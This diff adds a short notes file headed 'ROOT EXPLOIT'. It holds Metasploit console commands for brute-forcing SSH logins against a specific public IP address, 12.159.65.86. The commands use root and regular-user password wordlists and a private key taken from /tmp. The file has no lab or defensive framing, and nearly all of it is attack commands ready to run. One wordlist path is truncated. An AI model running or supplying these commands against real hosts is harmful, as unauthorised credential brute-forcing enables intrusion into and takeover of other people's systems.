@@ -1,0 +1,22 @@
+ROOT EXPLOIT:
+
+use auxiliary/scanner/ssh/ssh_login
+show options
+set RHOSTS 12.159.65.86
+set USERPASS_FILE /opt/metasploit/msf3/data/wordlists/root_userpass.txt
+set VERBOSE false
+run
+
+or REGULAR USER:
+
+set USER_FILE /opt/metasploit/msf3/data/wordlists/namelist.txt
+set PASS_FILE /opt/metasploit/msf3/data/wordlists/unix_passwords.tx
+
+or PUBKEY:
+
+use auxiliary/scanner/ssh/ssh_login_pubkey
+show options
+set KEY_FILE /tmp/id_rsa
+set USERNAME root
+set RHOSTS 12.159.65.86
+run
